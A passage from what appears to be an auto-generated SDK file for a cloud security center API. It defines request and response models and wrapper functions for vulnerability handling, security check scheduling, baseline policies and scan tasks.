    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLoginSwitchConfig(request: ModifyLoginSwitchConfigRequest): ModifyLoginSwitchConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginSwitchConfigWithOptions(request, runtime);
}

model ModifyNoticeConfigRequest {
  project?: string(name='Project'),
  route?: int32(name='Route'),
  sourceIp?: string(name='SourceIp'),
  timeLimit?: int32(name='TimeLimit'),
}

model ModifyNoticeConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyNoticeConfigResponseBody(name='body'),
}

async function modifyNoticeConfigWithOptions(request: ModifyNoticeConfigRequest, runtime: Util.RuntimeOptions): ModifyNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.route)) {
    query['Route'] = request.route;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.timeLimit)) {
    query['TimeLimit'] = request.timeLimit;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyNoticeConfig(request: ModifyNoticeConfigRequest): ModifyNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyNoticeConfigWithOptions(request, runtime);
}

model ModifyOpenLogShipperRequest {
  from?: string(name='From'),
}

model ModifyOpenLogShipperResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyOpenLogShipperResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOpenLogShipperResponseBody(name='body'),
}

async function modifyOpenLogShipperWithOptions(request: ModifyOpenLogShipperRequest, runtime: Util.RuntimeOptions): ModifyOpenLogShipperResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOpenLogShipper',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyOpenLogShipper(request: ModifyOpenLogShipperRequest): ModifyOpenLogShipperResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOpenLogShipperWithOptions(request, runtime);
}

model ModifyOperateVulRequest {
  info?: string(name='Info', description='The details of the vulnerability. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the vulnerability.

*   **uuid**: the UUID of the server on which the vulnerability is detected.

*   **tag**: the tag that is added to the vulnerability. Valid values:

    *   **oval**: Linux software vulnerability
    *   **system**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability

>  You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the tags that are added to vulnerabilities of other types.

*   **isFront**: specifies whether a pre-patch is required to fix the Windows system vulnerability. This field is required only for Windows system vulnerabilities. Valid values:

    *   **0**: no
    *   **1**: yes

>  You can fix multiple vulnerabilities at a time. Separate the details of multiple vulnerabilities with commas (,). You can call the [DescribeVulLIst](~~DescribeVulList~~) operation to query the details of vulnerabilities.', example='[{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"a3bb82a8-a3bd-4546-acce-45ac34af****","tag":"oval","isFront":0},{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"98a6fecc-88cd-46f2-8e35-f808a388****","tag":"oval","isFront":0}]'),
  operateType?: string(name='OperateType', description='The operation that you want to perform on the vulnerability. Valid values:

*   **vul_fix**: fixes the vulnerability.
*   **vul_verify**: verifies the vulnerability.
*   **vul_ignore**: ignores the vulnerability.
*   **vul\\_undo_ignore**: cancels ignoring the vulnerability.
*   **vul_delete**: deletes the vulnerability.', example='vul_fix'),
  reason?: string(name='Reason', description='The reason why the vulnerability is **ignored**.

>  This parameter is required only when you set **OperateType** to **vul_ignore**.', example='not operate'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **sca**: vulnerability that is detected based on software component analysis

>  You cannot fix the urgent vulnerabilities, application vulnerabilities, or vulnerabilities that are detected based on software component analysis.', example='cve'),
}

model ModifyOperateVulResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DFE4F166-1AC9-4FAC-A4E4-F0608AD705A6'),
}

model ModifyOperateVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOperateVulResponseBody(name='body'),
}

async function modifyOperateVulWithOptions(request: ModifyOperateVulRequest, runtime: Util.RuntimeOptions): ModifyOperateVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOperateVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyOperateVul(request: ModifyOperateVulRequest): ModifyOperateVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOperateVulWithOptions(request, runtime);
}

model ModifyPropertyScheduleConfigRequest {
  scheduleTime?: string(name='ScheduleTime', description='The new collection frequency of asset fingerprints. Valid values:

*   **0**: disabled, which indicates that the asset fingerprints are not automatically or periodically collected.
*   **1**: collects asset fingerprints once an hour.
*   **3**: collects asset fingerprints once every 3 hours.
*   **12**: collects asset fingerprints once every 12 hours.
*   **24**: collects asset fingerprints once a day.
*   **168**: collects asset fingerprints once every 7 days.', example='3'),
  type?: string(name='Type', description='The type of the asset fingerprints for which you want to modify the collection frequency. Valid values:

*   **scheduler\\_port_period**: listening port
*   **scheduler\\_process_period**: running process
*   **scheduler\\_account_period**: account
*   **scheduler\\_software_period**: software
*   **scheduler\\_cron_period**: scheduled task
*   **scheduler\\_sca_period**: middleware, database, or web service
*   **scheduler\\_autorun_period**: startup item
*   **scheduler\\_lkm_period**: kernel module
*   **scheduler\\_sca\\_proxy_period**: website', example='scheduler_port_period'),
}

model ModifyPropertyScheduleConfigResponseBody = {
  modifyResult?: boolean(name='ModifyResult', description='Indicates whether the collection frequency of asset fingerprints is modified. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C0D1DF51-D879-55A8-B6C7-7D3B913EF34D'),
}

model ModifyPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPropertyScheduleConfigResponseBody(name='body'),
}

async function modifyPropertyScheduleConfigWithOptions(request: ModifyPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifyPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scheduleTime)) {
    query['ScheduleTime'] = request.scheduleTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyPropertyScheduleConfig(request: ModifyPropertyScheduleConfigRequest): ModifyPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPropertyScheduleConfigWithOptions(request, runtime);
}

model ModifyPushAllTaskRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  tasks?: string(name='Tasks', description='The check items. Separate multiple check items with commas (,). Valid values:

*   **OVAL_ENTITY**: Common Vulnerabilities and Exposures (CVE) vulnerabilities
*   **CMS**: Web-CMS vulnerabilities
*   **SYSVUL**: Windows system vulnerabilities
*   **SCA**: application vulnerabilities
*   **HEALTH_CHECK**: baselines
*   **WEBSHELL**: webshells
*   **PROC_SNAPSHOT**: processes
*   **PORT_SNAPSHOT**: ports
*   **ACCOUNT_SNAPSHOT**: accounts
*   **SOFTWARE_SNAPSHOT**: software assets
*   **SCA_SNAPSHOT**: middleware', example='HEALTH_CHECK,OVAL_ENTITY'),
  uuids?: string(name='Uuids', description='The UUIDs of servers on which you want to perform security check tasks. Separate multiple UUIDs with commas (,).', example='inet-923b4538-0e88-409d-80ba-cb2e7487****,dc1691eb-656f-472f-b2aa-04f621f4****,70452f92-9fc1-45c5-ab35-e7bf8552****'),
}

model ModifyPushAllTaskResponseBody = {
  pushTaskRsp?: {
    pushTaskResultList?: [ 
      {
        groupId?: long(name='GroupId', description='The ID of the server group to which the server belongs.', example='226'),
        instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-wz9f7wlklxqnvdk****'),
        instanceName?: string(name='InstanceName', description='The name of the server.', example='TestInstance'),
        ip?: string(name='Ip', description='The IP address of the server.', example='127.XX.XX'),
        message?: string(name='Message', description='The message that describes the security check failure.', example='successful'),
        online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**: yes
*   **false**: no

>  If the Security Center agent of the server is offline, Security Center does not protect the server.', example='false'),
        osVersion?: string(name='OsVersion', description='The operating system version of the server.', example='linux'),
        region?: string(name='Region', description='The region in which the server resides.', example='cn-beijing'),
        success?: boolean(name='Success', description='Indicates whether the security check task is successful. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
        uuid?: string(name='Uuid', description='The UUID of the server.', example='5493fe42-61f5-4627-9aa2-8c449bbe****'),
      }
    ](name='PushTaskResultList', description='An array consisting of the servers on which security check tasks failed.'),
  }(name='PushTaskRsp', description='The results of security check tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='91EB4AC7-7FEF-4C72-BE49-4414E459AEC2'),
}

model ModifyPushAllTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPushAllTaskResponseBody(name='body'),
}

async function modifyPushAllTaskWithOptions(request: ModifyPushAllTaskRequest, runtime: Util.RuntimeOptions): ModifyPushAllTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tasks)) {
    query['Tasks'] = request.tasks;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPushAllTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyPushAllTask(request: ModifyPushAllTaskRequest): ModifyPushAllTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPushAllTaskWithOptions(request, runtime);
}

model ModifyRiskCheckStatusRequest {
  itemId?: long(name='ItemId', description='The ID of the check item.', example='37'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.223.XX.XX'),
  status?: string(name='Status', description='The method to handle the check item. Valid values:

*   **ignored**: ignores the check item.
*   **reset**: cancels ignoring the check item.', example='ignored'),
  taskId?: long(name='TaskId', description='The ID of the check task to which the check item belongs.', example='57'),
}

model ModifyRiskCheckStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model ModifyRiskCheckStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskCheckStatusResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request ModifyRiskCheckStatusRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyRiskCheckStatusResponse
 */
// Deprecated
async function modifyRiskCheckStatusWithOptions(request: ModifyRiskCheckStatusRequest, runtime: Util.RuntimeOptions): ModifyRiskCheckStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRiskCheckStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request ModifyRiskCheckStatusRequest
  * @return ModifyRiskCheckStatusResponse
 */
// Deprecated
async function modifyRiskCheckStatus(request: ModifyRiskCheckStatusRequest): ModifyRiskCheckStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRiskCheckStatusWithOptions(request, runtime);
}

model ModifyRiskSingleResultStatusRequest {
  ids?: [ string ](name='Ids', description='The IDs of the affected assets.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.XX.XX'),
  status?: string(name='Status', description='The method to handle the risk item. Valid values:

*   **ignored**: ignores the risk item.
*   **failed**: cancels the ignore operation on the risk item.', example='ignored'),
  taskId?: long(name='TaskId', description='The ID of the check task to which the affected asset belongs.', example='57'),
}

model ModifyRiskSingleResultStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
}

model ModifyRiskSingleResultStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskSingleResultStatusResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request ModifyRiskSingleResultStatusRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyRiskSingleResultStatusResponse
 */
// Deprecated
async function modifyRiskSingleResultStatusWithOptions(request: ModifyRiskSingleResultStatusRequest, runtime: Util.RuntimeOptions): ModifyRiskSingleResultStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRiskSingleResultStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request ModifyRiskSingleResultStatusRequest
  * @return ModifyRiskSingleResultStatusResponse
 */
// Deprecated
async function modifyRiskSingleResultStatus(request: ModifyRiskSingleResultStatusRequest): ModifyRiskSingleResultStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRiskSingleResultStatusWithOptions(request, runtime);
}

model ModifySecurityCheckScheduleConfigRequest {
  daysOfWeek?: string(name='DaysOfWeek', description='The days on which the automatic configuration check runs. You can specify multiple days. Separate multiple days with commas (,). Valid values:

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday', example='4,5,6'),
  endTime?: int32(name='EndTime', description='The time period during which the automatic configuration check ends. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='12'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  startTime?: int32(name='StartTime', description='The time period during which the automatic configuration check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='6'),
}

model ModifySecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='02287C0D-8DA9-5766-B51A-A63192BD3E80'),
}

model ModifySecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request ModifySecurityCheckScheduleConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfigWithOptions(request: ModifySecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifySecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.daysOfWeek)) {
    query['DaysOfWeek'] = request.daysOfWeek;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request ModifySecurityCheckScheduleConfigRequest
  * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfig(request: ModifySecurityCheckScheduleConfigRequest): ModifySecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityCheckScheduleConfigWithOptions(request, runtime);
}

model ModifySecurityEventMarkMissIndividuallyRequest {
  deleteMarkMissParam?: string(name='DeleteMarkMissParam', example='[{\\"field\\":\\"loginSourceIp\\",\\"operate\\":\\"contains\\",\\"eventType\\":\\"SIL_AI_ALERT\\",\\"eventName\\":\\"login_common_ip\\",\\"fieldValue\\":\\"10.12.XX.XX\\",\\"uuids\\":\\"\\"}]'),
  from?: string(name='From', example='sas'),
  insertMarkMissParam?: string(name='InsertMarkMissParam', example='[{\\"field\\":\\"location\\",\\"operate\\":\\"contains\\",\\"eventType\\":\\"SIL_AI_ALERT\\",\\"eventName\\":\\"login_common_ip\\",\\"fieldValue\\":\\"xx\\",\\"uuids\\":\\"4296ee47-bf19-4fa4-a4a6-6bxxxxxxxxx\\"}]'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='127.0.XX.XX'),
}

model ModifySecurityEventMarkMissIndividuallyResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A37B852F-E346-5FF2-82BD-D1F1DXXXXXX'),
  success?: boolean(name='Success', example='true'),
  timeCost?: long(name='TimeCost', example='1'),
}

model ModifySecurityEventMarkMissIndividuallyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityEventMarkMissIndividuallyResponseBody(name='body'),
}

async function modifySecurityEventMarkMissIndividuallyWithOptions(request: ModifySecurityEventMarkMissIndividuallyRequest, runtime: Util.RuntimeOptions): ModifySecurityEventMarkMissIndividuallyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.deleteMarkMissParam)) {
    body['DeleteMarkMissParam'] = request.deleteMarkMissParam;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.insertMarkMissParam)) {
    body['InsertMarkMissParam'] = request.insertMarkMissParam;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityEventMarkMissIndividually',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifySecurityEventMarkMissIndividually(request: ModifySecurityEventMarkMissIndividuallyRequest): ModifySecurityEventMarkMissIndividuallyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityEventMarkMissIndividuallyWithOptions(request, runtime);
}

model ModifyStartVulScanRequest {
  types?: string(name='Types', description='The types of vulnerabilities that can be detected. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **image**: container image vulnerabilities

>  If you leave this parameter empty, all types of vulnerabilities can be detected.', example='cve,sys,cms,app,emg'),
  uuids?: string(name='Uuids', description='The UUIDs of servers.', example='{"i-sdada-xxxxx","i-ifaedada-sfsasdxxx"}'),
}

model ModifyStartVulScanResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='4066CAC3-F83A-4729-9995-A5558A61B546'),
}

model ModifyStartVulScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStartVulScanResponseBody(name='body'),
}

async function modifyStartVulScanWithOptions(request: ModifyStartVulScanRequest, runtime: Util.RuntimeOptions): ModifyStartVulScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStartVulScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStartVulScan(request: ModifyStartVulScanRequest): ModifyStartVulScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStartVulScanWithOptions(request, runtime);
}

model ModifyStrategyRequest {
  customType?: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **custom**: a custom baseline check policy
*   **common**: a standard baseline check policy', example='common'),
  cycleDays?: string(name='CycleDays', description='The new interval of the baseline check. Valid values:

*   **1**: every 2 days
*   **3**: every 4 days
*   **7**: every 8 days
*   **30**: every 31 days', example='1'),
  cycleStartTime?: string(name='CycleStartTime', description='The new time range during which the baseline check starts. Valid values:

*   **0**: The baseline check starts within the time range from 00:00 to 06:00.
*   **6**: The baseline check starts within the time range from 06:00 to 12:00.
*   **12**: The baseline check starts within the time range from 12:00 to 18:00.
*   **18**: The baseline check starts within the time range from 18:00 to 24:00.

>  This parameter is deprecated.', example='18'),
  endTime?: string(name='EndTime', description='The time when the baseline check based on the baseline check policy ends.', example='05:00:00'),
  id?: string(name='Id', description='The ID of the baseline check policy.', example='245'),
  name?: string(name='Name', description='The new name of the baseline check policy.', example='testStrategy'),
  riskCustomParams?: string(name='RiskCustomParams', description='The custom configurations of the baseline. The value of this parameter is in the JSON format and contains the following fields:

*   **typeName**: the name of the baseline.

*   **checkDetails**: the details of the baseline. The value is in the JSON format.

    *   **checkId**: the ID of the check item.

    *   **rules**: the rule configurations. The value is in the JSON format.

        *   **ruleId**: the ID of the rule.

        *   **paramList**: the list of parameters in the rule. The value is in the JSON format.

            *   **paramName**: the name of the parameter.
            *   **value**: the value of the parameter.', example='[{"typeName":"hc_centos_6_custom","checkDetails":[{"checkId":4,"rules":[{"ruleId":"pass_min_days_login_defs.must.cus","paramList":[{"paramName":"range_val","value":"7"}]}]}]}]'),
  riskSubTypeName?: string(name='RiskSubTypeName', description='The subtype of the baselines. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the subtypes of baselines.', example='hc_exploit_redis'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X'),
  startTime?: string(name='StartTime', description='The time when the baseline check based on the baseline check policy starts.', example='00:01:00'),
  targetType?: string(name='TargetType', description='The method that is used to apply the baseline check policy. Valid values:

*   **groupId**: asset groups
*   **uuid**: assets', example='groupId'),
}

model ModifyStrategyResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8EFA2BD9-00CD-5D69-B6B0-4EE83EAF072E'),
  result?: {
    strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.', example='8164239'),
  }(name='Result', description='The result returned.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyResponseBody(name='body'),
}

async function modifyStrategyWithOptions(request: ModifyStrategyRequest, runtime: Util.RuntimeOptions): ModifyStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.cycleDays)) {
    query['CycleDays'] = request.cycleDays;
  }
  if (!Util.isUnset(request.cycleStartTime)) {
    query['CycleStartTime'] = request.cycleStartTime;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.riskCustomParams)) {
    query['RiskCustomParams'] = request.riskCustomParams;
  }
  if (!Util.isUnset(request.riskSubTypeName)) {
    query['RiskSubTypeName'] = request.riskSubTypeName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStrategy(request: ModifyStrategyRequest): ModifyStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyWithOptions(request, runtime);
}

model ModifyStrategyTargetRequest {
  config?: string(name='Config', description='The ID of the baseline check policy. The ID is returned after the policy is created. The value of this parameter is in the JSON format and contains the following field:

*   **strategyId**: the ID of the policy', example='{"strategyId":8070645}'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
